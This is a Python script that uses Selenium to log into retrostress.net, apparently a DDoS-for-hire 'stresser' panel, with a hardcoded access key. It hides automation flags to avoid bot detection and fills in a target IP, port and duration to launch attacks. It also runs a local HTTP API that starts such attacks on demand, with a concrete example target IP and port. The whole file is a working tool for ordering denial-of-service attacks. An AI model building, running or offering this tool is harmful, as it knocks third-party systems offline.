import time
import json
import sys
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import urlparse, parse_qs
import threading
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.chrome.service import Service

class RetroStressBot:
    def __init__(self):
        self.driver = None
        self.is_logged_in = False
        
    def setup_driver(self):
        """Setup Chrome driver with options"""
        chrome_options = Options()
        chrome_options.add_argument('--no-sandbox')
        chrome_options.add_argument('--disable-dev-shm-usage')
        chrome_options.add_argument('--disable-blink-features=AutomationControlled')
        chrome_options.add_experimental_option("excludeSwitches", ["enable-automation"])
        chrome_options.add_experimental_option('useAutomationExtension', False)
        chrome_options.add_argument("--window-size=1920,1080")
        
        # Headless mode (comment if you want to see the browser)
        # chrome_options.add_argument('--headless')
        
        try:
            self.driver = webdriver.Chrome(options=chrome_options)
            self.driver.execute_script("Object.defineProperty(navigator, 'webdriver', {get: () => undefined})")
            return True
        except Exception as e:
            print(f"[-] Chrome driver error: {e}")
            print("[!] Make sure Chrome browser is installed")
            return False
    
    def login(self, access_key):
        """Login to retrostress.net using browser automation"""
        print("[*] Opening browser...")
        
        if not self.setup_driver():
            return False
        
        try:
            # Go to login page
            print("[*] Navigating to retrostress.net...")
            self.driver.get("https://retrostress.net/auth")
            time.sleep(3)
            
            # Find access key input field
            print("[*] Looking for access key field...")
            
            # Try different selectors
            selectors = [
                "input[name='accessKey']",
                "input[placeholder*='Access']",
                "input[placeholder*='Key']",
                "input[type='text']",
                "input[type='password']",
                "#accessKey",
                ".access-key-input"
            ]
            
            input_field = None
            for selector in selectors:
                try:
                    input_field = self.driver.find_element(By.CSS_SELECTOR, selector)
                    if input_field:
                        print(f"[+] Found input field: {selector}")
                        break
                except:
                    continue
            
            if input_field:
                input_field.clear()
                input_field.send_keys(access_key)
                time.sleep(1)
                
                # Find and click login button
                button_selectors = [
                    "button[type='submit']",
                    "button:contains('Login')",
                    "button:contains('Sign In')",
                    ".login-btn",
                    "#loginBtn"
                ]
                
                login_button = None
                for selector in button_selectors:
                    try:
                        if 'contains' in selector:
                            login_button = self.driver.find_element(By.XPATH, f"//button[contains(text(), 'Login')]")
                        else:
                            login_button = self.driver.find_element(By.CSS_SELECTOR, selector)
                        if login_button:
                            print(f"[+] Found login button: {selector}")
                            break
                    except:
                        continue
                
                if login_button:
                    login_button.click()
                    print("[*] Logging in...")
                    time.sleep(5)
                    
                    # Check if login successful
                    if "panel" in self.driver.current_url or "dashboard" in self.driver.current_url:
                        print("[✓] Login successful!")
                        self.is_logged_in = True
                        return True
                    else:
                        print("[-] Login might have failed")
                        return False
            else:
                print("[-] Could not find access key input field")
                return False
                
        except Exception as e:
            print(f"[-] Login error: {e}")
            return False
    
    def send_attack(self, ip, port, duration):
        """Send attack using browser automation"""
        if not self.is_logged_in:
            print("[-] Not logged in!")
            return False
        
        try:
            print(f"[*] Preparing attack on {ip}:{port} for {duration}s")
            
            # Go to attack page if needed
            if "/panel" not in self.driver.current_url:
                self.driver.get("https://retrostress.net/panel")
                time.sleep(3)
            
            # Look for attack form
            print("[*] Looking for attack form...")
            
            # Try to find IP input
            ip_input = None
            ip_selectors = [
                "input[name='ip']",
                "input[placeholder*='IP']",
                "input[placeholder*='Address']",
                "input[placeholder*='Host']",
                "#ip",
                ".ip-input"
            ]
            
            for selector in ip_selectors:
                try:
                    ip_input = self.driver.find_element(By.CSS_SELECTOR, selector)
                    if ip_input:
                        print(f"[+] Found IP field")
                        break
                except:
                    continue
            
            if ip_input:
                ip_input.clear()
                ip_input.send_keys(ip)
                time.sleep(0.5)
            
            # Find port input
            port_input = None
            port_selectors = [
                "input[name='port']",
                "input[placeholder*='Port']",
                "#port",
                ".port-input"
            ]
            
            for selector in port_selectors:
                try:
                    port_input = self.driver.find_element(By.CSS_SELECTOR, selector)
                    if port_input:
                        print(f"[+] Found Port field")
                        break
                except:
                    continue
            
            if port_input:
                port_input.clear()
                port_input.send_keys(str(port))
                time.sleep(0.5)
            
            # Find time input
            time_input = None
            time_selectors = [
                "input[name='time']",
                "input[placeholder*='Time']",
                "input[placeholder*='Duration']",
                "#time",
                ".time-input",
                "input[name='duration']"
            ]
            
            for selector in time_selectors:
                try:
                    time_input = self.driver.find_element(By.CSS_SELECTOR, selector)
                    if time_input:
                        print(f"[+] Found Time field")
                        break
                except:
                    continue
            
            if time_input:
                time_input.clear()
                time_input.send_keys(str(duration))
                time.sleep(0.5)
            
            # Find attack button
            attack_button = None
            button_selectors = [
                "button:contains('Attack')",
                "button:contains('Start')",
                "button:contains('Launch')",
                ".attack-btn",
                "#attackBtn",
                "button[type='submit']"
            ]
            
            for selector in button_selectors:
                try:
                    if 'contains' in selector:
                        attack_button = self.driver.find_element(By.XPATH, f"//button[contains(text(), 'Attack')]")
                    else:
                        attack_button = self.driver.find_element(By.CSS_SELECTOR, selector)
                    if attack_button:
                        print(f"[+] Found Attack button")
                        break
                except:
                    continue
            
            if attack_button:
                attack_button.click()
                print(f"[✓] Attack started!")
                
                # Wait for attack duration
                print(f"[⏳] Attack running for {duration} seconds...")
                
                # Show progress
                for remaining in range(duration, 0, -10):
                    time.sleep(10)
                    print(f"[⏳] {remaining} seconds remaining...")
                
                time.sleep(duration % 10)
                print(f"[✓] Attack completed!")
                return True
            else:
                print("[-] Could not find attack button")
                # Try JavaScript injection as fallback
                try:
                    self.driver.execute_script(f"""
                        var event = new Event('attack');
                        window.dispatchEvent(event);
                    """)
                    print("[!] Attempted JS injection")
                    time.sleep(duration)
                    return True
                except:
                    return False
                
        except Exception as e:
            print(f"[-] Attack error: {e}")
            return False
    
    def close(self):
        """Close browser"""
        if self.driver:
            self.driver.quit()
            print("[✓] Browser closed")

# Your auth key
ACCESS_KEY = "5a3736056e1d471cb91d92aaaeb867b538392227db7842789080c8a49ae25773"

# Global bot instance
bot = None

class AttackHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        global bot
        
        if self.path.startswith('/api'):
            parsed = urlparse(self.path)
            params = parse_qs(parsed.query)
            
            ip = params.get('ip', [None])[0]
            port = params.get('port', [None])[0]
            time_param = params.get('time', [None])[0]
            
            if not all([ip, port, time_param]):
                self.send_json_response(400, {
                    "error": "Missing parameters",
                    "usage": "/api?ip=IP&port=PORT&time=TIME",
                    "example": "/api?ip=50.7.23.74&port=22&time=30"
                })
                return
            
            try:
                duration = int(time_param)
                if duration < 30:
                    self.send_json_response(400, {
                        "error": "Minimum time is 30 seconds"
                    })
                    return
                
                # Send immediate response
                self.send_json_response(200, {
                    "status": "success",
                    "message": f"Attack started on {ip}:{port} for {duration} seconds",
                    "ip": ip,
                    "port": port,
                    "duration": duration
                })
                
                # Run attack in background
                def run_attack():
                    if bot and bot.is_logged_in:
                        bot.send_attack(ip, port, duration)
                    else:
                        print("[-] Bot not logged in!")
                
                attack_thread = threading.Thread(target=run_attack)
                attack_thread.daemon = True
                attack_thread.start()
                
            except ValueError:
                self.send_json_response(400, {"error": "Invalid time parameter"})
                
        elif self.path == '/' or self.path == '/health':
            self.send_json_response(200, {
                "service": "RetroStress Attack Bot",
                "status": "online",
                "browser": "Chrome Automation",
                "logged_in": bot.is_logged_in if bot else False,
                "endpoint": "/api?ip=IP&port=PORT&time=TIME",
                "example": "http://127.0.0.1:8080/api?ip=50.7.23.74&port=22&time=30"
            })
        else:
            self.send_json_response(404, {"error": "Not found"})
    
    def send_json_response(self, status_code, data):
        self.send_response(status_code)
        self.send_header('Content-Type', 'application/json')
        self.send_header('Access-Control-Allow-Origin', '*')
        self.end_headers()
        self.wfile.write(json.dumps(data, indent=2).encode())
    
    def log_message(self, format, *args):
        pass

def main():
    global bot
    
    print("="*60)
    print("🤖 RetroStress Attack Bot with Chrome Automation")
    print("="*60)
    
    # Initialize bot
    bot = RetroStressBot()
    
    # Login
    if not bot.login(ACCESS_KEY):
        print("[-] Login failed! Exiting...")
        if bot:
            bot.close()
        sys.exit(1)
    
    print("\n✅ Bot ready! Starting API server...\n")
    
    # Start API server
    try:
        server = HTTPServer(('0.0.0.0', 8080), AttackHandler)
        print("="*60)
        print("🚀 SERVER RUNNING")
        print("="*60)
        print(f"📍 URL: http://127.0.0.1:8080")
        print(f"📡 API: http://127.0.0.1:8080/api?ip=IP&port=PORT&time=TIME")
        print(f"\n📝 Example:")
        print(f"   curl 'http://127.0.0.1:8080/api?ip=50.7.23.74&port=22&time=30'")
        print(f"\n🔧 Press Ctrl+C to stop")
        print("="*60 + "\n")
        
        server.serve_forever()
        
    except KeyboardInterrupt:
        print("\n\n🛑 Shutting down...")
        server.shutdown()
        if bot:
            bot.close()
        print("✅ Server stopped")
    except Exception as e:
        print(f"❌ Error: {e}")
        if bot:
            bot.close()
        sys.exit(1)

if __name__ == "__main__":
    main()
